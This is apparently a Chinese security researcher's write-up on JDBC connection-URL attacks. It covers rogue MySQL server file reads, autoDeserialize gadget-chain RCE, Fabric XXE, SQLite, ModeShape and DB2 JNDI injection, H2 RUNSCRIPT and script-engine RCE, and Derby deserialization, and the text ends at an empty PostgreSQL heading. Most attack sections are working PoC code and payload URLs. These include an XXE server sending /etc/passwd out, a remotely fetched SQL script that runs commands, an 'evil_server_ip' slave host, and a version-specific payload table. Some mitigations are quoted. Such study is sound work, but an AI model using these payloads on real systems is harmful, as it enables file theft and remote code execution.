# Mysql任意文件读取

MySQL支持使用LOAD DATA LOCAL INFILE语句，即可将客户端本地的文件中的数据insert到MySQL的某张表中

来把我机器上的/etc/passwd读到这个table表里面

```
load data local infile '/etc/passwd' into table users fields terminated by '\n';
```

![image-20221202204347559](images/1.png)

还有个LOAD DATA INFILE语句，这是加载服务端的文件而非客户端的

LOAD DATA LOCAL INFILE的工作过程大致如下：

1. 用户在客户端输入：`load data local file "/data.txt" into table test；`
2. 客户端->服务端：我想把我本地的/data.txt文件插入到test表中；
3. 服务端->客户端：把你本地的/data.txt文件发给我；
4. 客户端->服务端：/data.txt文件的内容；

## 漏洞原理

客户端发送给服务端的文件，不是取决于自己说的，而是根据第三步中服务端需要的，可以来看看漏洞工作流程和上面工作流程的区别

1. 用户在客户端输入：`load data local file "/data.txt" into table test；`
2. 客户端->服务端：我想把我本地的/data.txt文件插入到test表中；
3. 服务端->客户端：把你本地的/etc/passwd文件发给我；
4. 客户端->服务端：/etc/passwd文件的内容；

这样就可以读取任意的文件内容了

在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露

攻击流程：

1. 攻击者开启伪造的恶意MySQL服务器，诱使受害者MySQL客户端访问；
2. 受害者向恶意MySQL服务器发起请求，并尝试进行身份认证；
3. 恶意MySQL服务器接受到受害者的连接请求后，发送正常的问候、身份验证正确并且发送LOAD DATA LOCAL INFILE语句来读取受害者客户端本地敏感文件；
4. 受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过LOAD DATA LOCAL INFILE语句将本地文件内容发给恶意MySQL服务器；
5. 恶意MySQL服务器接受到客户端敏感文件；

GitHub上恶意MySQL服务相关项目：

- https://github.com/rmb122/rogue_mysql_server
- https://github.com/Gifts/Rogue-MySql-Server

## 漏洞复现

```
package JDBCAttack;

import java.sql.Connection;
import java.sql.DriverManager;

public class test {
    public static void main(String[] args) throws Exception{
        String url = "jdbc:mysql://127.0.0.1:2333/test?user=fileread_/etc/passwd";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
```

工具地址：https://github.com/fnmsd/MySQL_Fake_Server

改一下里面的服务端口，我改到了2333

![image-20221202210141404](images/2.png)

读到了/etc/passwd的内容

## allowUrlInLocalInfile的使用

**条件**

- JDBC连接可控
- 开启`allowUrlInLocalInfile`, 默认关闭

**作用**

能够使用URL类支持的所有协议，进行SSRF获取file协议读取本地文件

既然能够ssrf的话，那就可以列文件目录了

### 实现

修改工具的config.json

![image-20221202210925153](images/3.png)

在fileread这里多加一行

测试代码

```
package JDBCAttack;

import java.sql.Connection;
import java.sql.DriverManager;

public class test {
    public static void main(String[] args) throws Exception{
        String url = "jdbc:mysql://127.0.0.1:2333/test?user=ls&allowUrlInLocalInfile=true";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
```

![image-20221202211021413](images/4.png)

读到了根目录，如果这个配置没有开启的话，就是如下情况

![image-20221202211103729](images/5.png)

既然是SSRF，那就可以通过http去访问对应网页

```
String url = "jdbc:mysql://127.0.0.1:2333/test?user=fileread_http://127.0.0.1:8888/&allowUrlInLocalInfile=true"
```

![image-20221202211508662](images/6.png)

收到了对应的请求

有时候还会看到一个MaxAllowedPacket

![image-20221202213255543](images/7.png)

所以说有时候可以这样写

```
String url = "jdbc:mysql://127.0.0.1:2333/test?user=fileread_file:///etc/passwd/&allowUrlInLocalInfile=true&maxAllowedPacket=655360";
```

### 修复

使用属性进行覆盖

```java
public class Test {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("com.mysql.jdbc.Driver");
        String url = "jdbc:mysql://127.0.0.1:2333/test?user=fileread_/etc/passwd&maxAllowedPacket=655360&allowUrlInLocalInfile=true";
        Properties properties = new Properties();
        properties.setProperty("allowLoadLocalInfile","false");
        Connection con = DriverManager.getConnection(url, properties);
    }
}
```

## 解决方案

1. 使用SSL建立可信连接

```java
jdbc:mysql://myDatabaseInfo:3306/test?useSSL=true&trustCertificateKeyStoreUrl=path\to\truststore&trustCertificateKeyStorePassword=myPassword
```

1. 在配置文件中禁用`LOAD`读取文件

MySQL官方给出如下说明（这里就全是复制粘贴了）

> 为了避免连接到不受信任的服务器，客户端可以建立安全连接并通过使用[`--ssl-mode=VERIFY_IDENTITY`](https://dev.mysql.com/doc/refman/5.7/en/connection-options.html#option_general_ssl-mode)选项和适当的CA证书进行连接来验证服务器身份 。
>
> 为避免出现[`LOAD DATA`](https://dev.mysql.com/doc/refman/5.7/en/load-data.html)问题，客户应避免使用`LOCAL`。
>
> 管理员和应用程序可以配置是否允许本地数据加载，如下所示：
>
> - 在服务器端：
>
>   - 所述[`local_infile`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile)系统变量控制服务器端`LOCAL` 的能力。根据 [`local_infile`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile)设置，服务器会拒绝或允许请求本地数据加载的客户端加载本地数据。
>   - 默认情况下，它[`local_infile`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile) 是禁用的。要显式地使服务器拒绝或允许[`LOAD DATA LOCAL`](https://dev.mysql.com/doc/refman/5.7/en/load-data.html)语句（无论在构建时或运行时如何配置客户端程序和库），请在 禁用或启用的情况下启动**mysqld**[`local_infile`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile)。[`local_infile`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile)也可以在运行时设置。
>
> - 在客户端：
>
>   - 该**CMake的**选项控制编译默认的MySQL客户端库能力（见 [MySQL源代码的配置选项](https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html)）。因此，未进行明确安排的客户端将 根据MySQL构建时指定的设置禁用或启用功能 。 [`ENABLED_LOCAL_INFILE`](https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile) `LOCAL``LOCAL`[`ENABLED_LOCAL_INFILE`](https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile)
>
>   - 默认情况下，MySQL二进制发行版中的客户端库在[`ENABLED_LOCAL_INFILE`](https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile) 启用时进行编译 。如果从源代码编译MySQL，请[`ENABLED_LOCAL_INFILE`](https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile) 根据未进行显式安排的客户端应`LOCAL` 禁用还是启用功能，将其配置为禁用或启用。
>
>   - 对于使用C API的客户端程序，本地数据加载功能由编译到MySQL客户端库中的默认值决定。要显式启用或禁用它，请调用[`mysql_options()`](https://dev.mysql.com/doc/c-api/5.7/en/mysql-options.html) C API函数以禁用或启用该 `MYSQL_OPT_LOCAL_INFILE`选项。参见 [mysql_options（）](https://dev.mysql.com/doc/c-api/5.7/en/mysql-options.html)。
>
>   - 对于**mysql**客户端，本地数据加载能力由编译到MySQL客户端库中的默认值决定。要显式禁用或启用它，请使用 [`--local-infile=0`](https://dev.mysql.com/doc/refman/5.7/en/mysql-command-options.html#option_mysql_local-infile)或 [`--local-infile[=1\]`](https://dev.mysql.com/doc/refman/5.7/en/mysql-command-options.html#option_mysql_local-infile)选项。
>
>   - 对于**mysqlimport**客户端，默认情况下不使用本地数据加载。要显式禁用或启用它，请使用 [`--local=0`](https://dev.mysql.com/doc/refman/5.7/en/mysqlimport.html#option_mysqlimport_local)或 [`--local[=1\]`](https://dev.mysql.com/doc/refman/5.7/en/mysqlimport.html#option_mysqlimport_local)选项。
>
>   - 如果[`LOAD DATA LOCAL`](https://dev.mysql.com/doc/refman/5.7/en/load-data.html)在Perl脚本或其他`[client]`从选项文件中读取该组的程序中使用，则可以向该组添加 `local-infile`选项设置。为防止不理解此选项的程序出现问题，请使用[`loose-`](https://dev.mysql.com/doc/refman/5.7/en/option-modifiers.html) 前缀指定它 ：
>
>     ```
>     >     [client]
>     >     loose-local-infile=0
>     >
>     ```
>
>     ![image-20221202214627819](images/8.png)

> ```
> 或者： >     [client]>     loose-local-infile=1> 
> ```

> - 在所有情况下，`LOCAL` 客户端成功使用加载操作还需要服务器允许本地加载。
>
> 如果`LOCAL`禁用了此功能，则在服务器或客户端上，尝试发出[`LOAD DATA LOCAL`](https://dev.mysql.com/doc/refman/5.7/en/load-data.html)语句的客户端都会 收到以下错误消息：
>
> ```
> > ERROR 1148: The used command is not allowed with this MySQL version
> >
> ```

MySQL蜜罐：https://github.com/qigpig/MysqlHoneypot

# JDBC反序列化（MySql）

## 漏洞复现

复现环境：mysql-connector-java:8.0.12

```
package JDBCAttack;

import java.sql.Connection;
import java.sql.DriverManager;

public class test {
    public static void main(String[] args) throws Exception{
        String url = "jdbc:mysql://127.0.0.1:2333/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&&user=yso_CommonsCollections6_open -a Calculator";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
```

![image-20221204114930372](images/9.png)

这里如果用到mac的话，只会看到一个计算器，因为mac的计算器打开后，再次执行open -a Calculator 不会再打开一个新的计算器，如果用的windows的话，可以看到4个计算器，mac用jconsole命令的话，可以看到打开了四个jconsole窗口

如果有兴趣对POC进行编写可以参考https://xz.aliyun.com/t/8159#toc-1

这篇文章通过抓包分析了Mysql交互对数据包，然后叙述了POC的编写过程，这里的POC主要是去将反序列化的数据转化为bytecode插入到show session status的结果中

而su18通过corba来改变了执行语句，将bytecode插入到对应的数据表中去实现了攻击

## 漏洞分析

既然是反序列化，就需要readObject去装入Gadget，这里我添加了CC链的依赖，最后的漏洞触发点在ResultSetImpl的getObject方法

![image-20221204115306579](images/10.png)

那就从最开始执行开始分析看看最后是怎么一步一步走到这个readObject方法并触发了四次

跟进DriverManager的getConnection方法

![image-20221204130414377](images/11.png)

来到这儿的connect方法

![image-20221204132058042](images/12.png)

这里构造ConnectUrl对象，可以跟进来看看怎么构建的，跟进getConnectionUrlInstance

![image-20221204135609111](images/13.png)

往下走，这里用ConnectionUrlParser的parseConnectionString分割conString，也就是我们传入的url

这个方法会实例化一次ConnectionUrlParser

```
public static ConnectionUrlParser parseConnectionString(String connString) {
    return new ConnectionUrlParser(connString);
}
```

![image-20221204135904822](images/14.png)

跟进parseConnectionString

![image-20221204140001745](images/15.png)

这里将URL分割为四部分存到ConnectionUrlParser的四个变量中

![image-20221204140058465](images/16.png)

```
scheme -> jdbc:mysql:（数据库连接类型）
authority -> host:port
path -> 数据库
query -> 查询语句（带入的参数）
```

回到getConnectionUrlInstance方法

![image-20221204140138191](images/17.png)

往下走，进入switch中的第一个，跟进这里的getInstance

![image-20221204142739108](images/18.png)

接着跟

![image-20221204142808735](images/19.png)

最后来到ConnectionUrl，接下来，跟进collectProperties对query进行分割

![image-20221204143400747](images/20.png)

跟进getProperties

```
public Map<String, String> getProperties() {
    if (this.parsedProperties == null) {
        this.parseQuerySection();
    }

    return Collections.unmodifiableMap(this.parsedProperties);
}
```

跟进parseQuerySection

```
private void parseQuerySection() {
    if (StringUtils.isNullOrEmpty(this.query)) {
        this.parsedProperties = new HashMap();
    } else {
        this.parsedProperties = this.processKeyValuePattern(PROPERTIES_PTRN, this.query);
    }
}
```

跟进processKeyValuePattern

![image-20221204143604894](images/21.png)

这里用for循环将query不同参数的值分割，存储到一个hashmap中

![image-20221204143753661](images/22.png)

最好构建出来的ConnectionUrl对象如下

![image-20221204143916492](images/23.png)

在getConnectionUrlInstance方法中返回这个对象，然后回到最开始的connect方法

![image-20221204144112310](images/24.png)

往下走，跟进这里的Connection.getInstance，host作为参数

```
public static JdbcConnection getInstance(HostInfo hostInfo) throws SQLException {
    return new ConnectionImpl(hostInfo);
}
```

实例化了ConnectionImpl

![image-20221204151522122](images/25.png)

在这个构造方法中，会将host的属性进行分割，先把host的东西放入props中

![image-20221204161326491](images/26.png)

再放入propertySet中（是一个JdbcPropertySetImpl对象)

接着会创建`this.session `为 `NativeSession`对象

往下步进，来到

![image-20221204161425786](images/27.png)

接下来创建一个到服务器的IO通道，跟进

![image-20221204161516431](images/28.png)

跟进这里的connectOneTryOnly

![image-20221204161630730](images/29.png)

跟进initializePropsFromServer

![image-20221204161746837](images/30.png)

看到这里的loadServerVariables，前面任意文件读取的时候到这里就不能继续往下跟了，会抛出一个异常

这里调试到initializePropsFromServer的时候，已经向fake mysql server发送到login请求

![image-20221204161846998](images/31.png)

可以跟进这里的loadServerVariables看看

![image-20221204162037822](images/32.png)

当调试到这里的时候，就想恶意的mysql发送了一个信息，也就是在这里通过sendCommand进行了交互，接受了一个ResultSet

![image-20221204162100023](images/33.png)

然后就进行了任意文件的读取（其实还是了解mysql中客户端和服务端交互的原理即可）

回到initializePropsFromServer

![image-20221204162536682](images/34.png)

跟进这里的handleAutoCommitDefaults

![image-20221204162604156](images/35.png)

跟setAutoCommit

![image-20221204162709710](images/36.png)

继续跟进execSQL

![image-20221204162925364](images/37.png)

跟进这里的sendQueryString

![image-20221204163120538](images/38.png)

向下步进，调用这个类的sendQueryPacket方法

![image-20221204163244796](images/39.png)

这里的queryInterceptors不为空的话会调用invokeQueryInterceptorsPre

先前的`ConnectionImpl`对象中，初始化了一个`NativeSession`对象，后续的与服务器连接中都跟他有关系。然后调用`initializeSafeQueryInterceptors` 初始化查询拦截器，在ConnectionImpl的构造方法中

![image-20221204163511028](images/40.png)

```
public void initializeSafeQueryInterceptors() throws SQLException {
    try {
        this.queryInterceptors = (List)Util.loadClasses(this.propertySet.getStringProperty("queryInterceptors").getStringValue(), "MysqlIo.BadQueryInterceptor", this.getExceptionInterceptor()).stream().map((o) -> {
            return new NoSubInterceptorWrapper(o.init(this, this.props, this.session.getLog()));
        }).collect(Collectors.toList());
    } catch (CJException var2) {
        throw SQLExceptionsMapping.translateException(var2, this.getExceptionInterceptor());
    }
}
```

这里需要jdbc连接的属性中`queryInterceptors` 的值来加载类。所以这里要指定拦截器的类名，我们后面所调用的拦截器的方法，其实是在`com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`  类中，返回的是一个NoSubInterceptorWrapper对象

所以在payload中会有`queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`

跟进invokeQueryInterceptorsPre

![image-20221204163857636](images/41.png)

接下来调用NoSubInterceptorWrapper的preProcess方法

```
public <T extends Resultset> T preProcess(Supplier<String> sql, Query interceptedQuery) {
    this.underlyingInterceptor.preProcess(sql, interceptedQuery);
    return null;
}
```

这里的underlyingIntercepto就是我们设置的拦截器了，调用ServerStatusDiffInterceptor的process方法

```
public <T extends Resultset> T preProcess(Supplier<String> sql, Query interceptedQuery) {
    this.populateMapWithSessionStatusValues(this.preExecuteValues);
    return null;
}
```

继续跟进

![image-20221204164351408](images/42.png)

执行一次 `SHOW SESSION STATUS` 查询，并将结果返回给rs，并调用`ResultSetUtil.resultSetToMap`

所以说这了点rs是向mysql恶意服务端请求后返回的结果，是可以控制的，这样来返回一个恶意的对象

跟进这里的executeQuery

![image-20221204164521226](images/43.png)

这里又会执行一次execSQL，所以又会走一遍刚才的流程（所以在调试的过程中会看到又执行了一次sendQueryString），最后返回结果给rs，调用stmt.executeQuery

![image-20221204164750433](images/44.png)

跟进第二个getObject

![image-20221204165047714](images/45.png)

![image-20221204170051892](images/46.png)

这里有一个switch语句，而我们此次用到的反序列化点在

![image-20221204165118828](images/47.png)

我们来看看这个getObject的执行流程，BIT和BLOB类型过程是一样的，就拿一种来分析吧

```
BLOB (binary large object)，二进制大对象，是一个可以存储二进制文件的容器。在计算机中，BLOB常常是数据库中用来存储二进制文件的字段类型
```

首先通过获取columnIndex来获取数据

```
int columnIndexMinusOne = columnIndex - 1;
Field field = this.columnDefinition.getFields()[columnIndexMinusOne];
```

再通过field.getMysqlType()来获取数据类型，

```
mappedValues.put(rs.getObject(1), rs.getObject(2));
```

因为这里是有两个getObject的，所以通过上面代码来看，对应的是mysql的第一个或者第二个数据，我们只要保证有一个的数据类型是BLOB即可进行BLOB分支

如果是BIT类型，判断是否是二进制数据或者Blob

```
if (!field.isBinary() && !field.isBlob())
```

接下来判断autoDeserialize属性是否开启

```
if (!(Boolean)this.connection.getPropertySet().getBooleanProperty("autoDeserialize").getValue()) 
```

然后data长度大于等于2是为了下一个判断.

```
if (data != null && data.length >= 2)
```

这个判断是否是反序列化数据

```
if (data[0] != -84 || data[1] != -19)
```

判断前两个字节是否为`-84，-19`这是序列化字符串的标志，hex分别为`AC ED`, 如果满足条件（java序列化数据流开头标志为aced 0005），就会调用对应的`readObject`方法进行反序列化

![image-20221204170558187](images/48.png)

然后对传入进来的数据进行反序列化

![image-20221204170830915](images/49.png)

但是这只是第一次反序列化，我们往后面走，退回到了sendQueryPacket方法

![image-20221204171856593](images/50.png)

这里调用了invokeQueryInterceptorsPost方法

![image-20221204171939257](images/51.png)

调用interceptor的postProcess方法

```
public <T extends Resultset> T postProcess(Supplier<String> sql, Query interceptedQuery, T originalResultSet, ServerSession serverSession) {
    this.underlyingInterceptor.postProcess(sql, interceptedQuery, originalResultSet, serverSession);
    return null;
}
```

可以看到，这里调用了我们设置的拦截器的postProcess方法

![image-20221204172044013](images/52.png)

一路往下面跟，又来到了刚才漏洞触发点的前面，而且调用的参数也一样，所以这里会第二次出发反序列化执行命令

回到initializePropsFromServer往下

![image-20221204172312301](images/53.png)

刚才我们调用的是handleAutoCommitDefaults方法，这次调用setupServerForTruncationsChecks方法

因为前面为当前回话创立了一个session，现在在这个方法中又调用了一次execSQL方法，与刚才类似，又会执行两次反序列化

![image-20221204172425129](images/54.png)

至此，就执行了四次反序列化

## 关键属性

```
queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）

statementInterceptors:和上面的拦截器作用一致，实现了com.mysql.jdbc.StatementInterceptor接口的Class

到底应该使用哪一个属性，我们可以在对应版本的com.mysql.jdbc.ConnectionPropertiesImpl（5x）类中搜索，如果存在，就是存在的那个属性，在8x中是ConnectionImpl类

autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。
```

![image-20221204173028713](images/55.png)

## 版本区分

不同版本会有所不同，在MySQL_Fake Server的md文件中也写到

### ServerStatusDiffInterceptor触发

- **8.x:** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
- **6.x(属性名不同):** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
- **5.1.11及以上的5.x版本（包名没有了cj）:**` jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
- **5.1.10及以下的5.1.X版本：** 同上，但是需要连接后执行查询。
- **5.0.x:** 还没有`ServerStatusDiffInterceptor`这个东西

`5.1.11-6.0.6`使用的是`statementInterceptors`属性，而`8.0`以上使用`queryInterceptors`, 具体属性可以在`ConnectionPropertiesImpl`类中搜索

`5.1.11`以下，不能通过这种方式利用，因为在`5.1.10`中`Interceptors`的初始化过程在漏洞利用过程之后，将会在利用中，因为找不到`interceptor`而不能够触发成功

### detectCustomCollations触发

主要是在一下版本中的initializePropsFromServer方法可以调用this.session.buildCollationMapping()

在buildCollationMapping中可以调用`Util.resultSetToMap`方法，进而走到刚才的触发点

- **5.1.41及以上:** `5.1.29`以上只有`5.1.49`不可用，且`6.x`系列都可以使用（因为在`5.1.41`做出了更改，不再调用`Util.resultSetToMap`方法，进而调用getObject方法，改为了直接调用`getObject`方法）
- **5.1.29-5.1.40:** `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`
- **5.1.28-5.1.19：** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc`
- **5.1.18以下的5.1.x版本：** 不可用
- **5.0.x版本不可用**

`8.0.x`不存在getObject方法的调用

`6.x`能够利用，因为他在`com.mysql.cj.jdbc.ConnectionImpl`中调用了`ResultSetUtil.resultSetToMap`和上面的功能类似，且没有版本判断

从`5.1.29`开始启用`detectCustomCollations`属性，但是直到`5.1.49`做出了更改导致不能使用

在`5.1.19 - 5.1.28`过程中，不存在`detectCustomCollations`属性的判断，但是仍然可以调用

`5.1.18`以下没有使用`getObject`方法的调用



下面我将记录一些不同数据库的攻击，这里就不分析了，仅做一个复现

# XXE攻击

**原理**

在mysql connector 5.1.48版本中，注册了两个驱动。除了常见的驱动com.mysql.cj.jdbc.Driver之外，就是这个名为com.mysql.fabric.jdbc.FabricMySQLDriver的驱动。

MySQL Fabric 是一个管理 MySQL 服务器场的系统。MySQL Fabric 提供了一个可扩展且易于使用的系统，用于管理 MySQL 部署以实现分片和高可用性。

Litch1研究了FabricMySQLDriver的源码，发现如果连接url以jdbc:mysql:fabric://开头，程序就会进入Fabric流程逻辑。

**POC**

起一个flask，返回一个XXE的payload

```
from flask import Flask

app = Flask(__name__)

@app.route('/xxe.dtd', methods=['GET', 'POST'])
def xxe_oob():
    return '''<!ENTITY % aaaa SYSTEM "fiLe:///etc/passwd">
<!ENTITY % demo "<!ENTITY bbbb SYSTEM
'http://127,0.0.1:5000/xxe?data=%aaaa;'>"> %demo;'''
@app.route('/', methods=['GET', 'POST'])
def dtd():
    return '''<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://127.0.0.1:5000/xxe.dtd"> %xd;]>
<root>&bbbb;</root>'''
if __name__ == '__main__':
    app.run()
```

Xxetest.java

```
package JDBCAttack;

import java.sql.Connection;
import java.sql.DriverManager;

public class xxetest {
    public static void main(String[] args) throws Exception{
        String url = "jdbc:mysql:fabric://127.0.0.1:5000";
        Connection conn = DriverManager.getConnection(url);
    }
}
```

![image-20221208130836282](images/56.png)

拿到了/etc/passwd的数据

# 记录下不同数据库通过JDBC的攻击

## SQLite

`org.sqlite.SQLiteConnection#open`使用 SQLite 库打开与数据库的连接时调用方法。

该方法提供了一个特性：如果连接URL以 开头，则调用`:resource:`该方法从URL连接中获取数据库内容。

![image-20221208183910906](images/57.png)

extractResource方法

![image-20221208184018712](images/58.png)

这个攻击主要是通过sqlite远程加载sql命令达到执行任意sql命令的效果，然后通过加载恶意的dll或者so文件达到RCE的效果

依赖

```
<dependency>
    <groupId>org.xerial</groupId>
    <artifactId>sqlite-jdbc</artifactId>
    <version>3.35.0</version>
</dependency>
```

这里因为去搭建各种数据库太麻烦了，也主要只是记录一些payload，所以就写一个过程，没有去复现了

**利用**

```
Class.forName("org.sqlite.JDBC");
Connection connection = DriverManager.getConnection("jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db");
```

参考https://su18.org/post/jdbc-connection-url-attack/#sqlite

## ModeShape

[ModeShape](https://modeshape.jboss.org/)是 JCR（Java 内容存储库）的实现，使用 JCR API 从其他系统访问数据，例如文件系统、Subversion、JDBC 元数据……

存储库源可以像`jdbc:jcr:jndi:jcr:?repositoryName=repository`.

这个数据库的攻击方式主要就是JNDI注入了

```
<dependency>
    <groupId>org.modeshape</groupId>
    <artifactId>modeshape-jdbc</artifactId>
    <version>5.0.0.Final</version>
</dependency>
```

起一个恶意的RMI服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8088/#exp
```

poc

```
package JDBCAttack;

import java.sql.DriverManager;

public class testmodeshape {
    public static void main(String[] args) throws Exception {
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");
        DriverManager.getConnection("jdbc:jcr:jndi:rmi://127.0.0.1:1099/exp");
    }
}
```

![image-20221208185853237](images/59.png)

## DB2

```
<dependency>
    <groupId>com.ibm.db2</groupId>
    <artifactId>jcc</artifactId>
    <version>11.5.7.0</version>
</dependency>
```

这个数据库的攻击也是通过JNDI注入实现的

```
package JDBCAttack;

import java.sql.DriverManager;

public class TestDB2 {
    public static void main(String[] args) throws Exception{
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=rmi://127.0.0.1:1099/exp;");
    }
}
```

![image-20221208191047156](images/60.png)



## H2 RCE

### RUNSCRIPT

使用SpringBoot的H2接口

```
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-jpa</artifactId>
    <version>2.1.4.RELEASE</version>
</dependency>
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <scope>runtime</scope>
    <version>1.4.199</version>
</dependency>
```

这个RCE主要通过访问控制台后可以改变JDBC连接的URL造成RCE

条件，spring boot中需要开启console功能，需要在application.properties开启

```
spring.h2.console.enabled=true
spring.datasource.url=jdbc:h2:mem:testdb		# 不加的话可以会报错
spring.data.jpa.repositories.bootstrap-mode=default
```

然后访问`127.0.0.1:8080/h2-console`

![image-20221209131515308](images/61.png)

还有一些功能

```
spring.h2.console.settings.web-allow-others=true		#开启连接远程Web访问H2数据库
```

创建poc.sql

```
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "Success";}';CALL EXEC ('open -a Calculator.app')
```

然后改变JBDC连接的URL

```
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8088/poc.sql'
```

![image-20221209133707385](images/62.png)

#### 分析

在org.h2.engine.Engine#openSession，首先分离出INIT的值为`RUNSCRIPT FROM 'http://127.0.0.1:8088/poc.sql'`

![image-20221210110152207](images/63.png)

![image-20221210110139897](images/64.png)

![image-20221210110228535](images/65.png)

然后调用prepareCommand方法

```
public synchronized CommandInterface prepareCommand(String var1, int var2) {
    return this.prepareLocal(var1);
}
```

跟进prepareLocal

![image-20221210110634160](images/66.png)

跟进这里的prepareCommand

![image-20221210110658791](images/67.png)

实例化一个CommandContainer对象并返回，最后回到opensession方法，调用CommandContainer的executeUpdate

![image-20221210110727867](images/68.png)

跟进executeUpdate

![image-20221210110830744](images/69.png)

跟进update

![image-20221210110937736](images/70.png)

调用RunScriptCommand的update方法

![image-20221210111133583](images/71.png)

从远处获取poc.sql，随后调用execute执行sql语句

为什么我们使用命令“RUNSCRIPT”？

因为我们使用的POC需要执行两条SQL语句，第一条是CREATE ALIAS，第二条是EXEC，分两步走。但是`session.prepareCommand`不支持多条sql语句执行。所以我们使用RUNSCRIPT从远程服务器加载sql。

### 通过源代码编译器达到不出网利用

所以我们应该想办法将 POC sql 减少到只有一条语句，而不需要连接到远程服务器。

Litch1为语句的创建者查看了源码`CREATE ALIAS`，发现语句中JAVA METHOD的定义交给了源码编译类。支持三种编译器：Java/Javascript/Groovy。

#### JavaScript

```
package com.example.testspring;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class test {
    public static void main (String[] args) throws ClassNotFoundException, SQLException {
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
```

#### Groovy

需要groovy依赖

```
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-sql</artifactId>
    <version>3.0.9</version>
</dependency>
```

poc

```
package com.example.testspring;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class test {
    public static void main (String[] args) throws ClassNotFoundException, SQLException {
        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
```

分析的话就参考https://su18.org/post/jdbc-connection-url-attack/#source-code-compiler

## Apache Derby

这里也只记录一个攻击方法，这次的攻击时通过反序列化的

依赖

```
<dependency>
    <groupId>org.apache.derby</groupId>
    <artifactId>derby</artifactId>
    <version>10.10.1.1</version>
</dependency>
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.9.4</version>
</dependency>
```

POC

```
public static void main(String[] args) throws Exception{
    Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
    DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=evil_server_ip");
}
```

evil server

```
package ysoserial.test;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsBeanutils1;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class EvilSlaveServer {
    public static void main(String[] args) throws Exception {
        int port = 4851;
        ServerSocket server = new ServerSocket(port);
        Socket socket = server.accept();
        socket.getOutputStream().write(Serializer.serialize(new CommonsBeanutils1().getObject("open -a Calculator")));
        socket.getOutputStream().flush();
        Thread.sleep(TimeUnit.SECONDS.toMillis(5));
        socket.close();
        server.close();
    }
}

```



# Postgresql RCE

## 漏洞简介

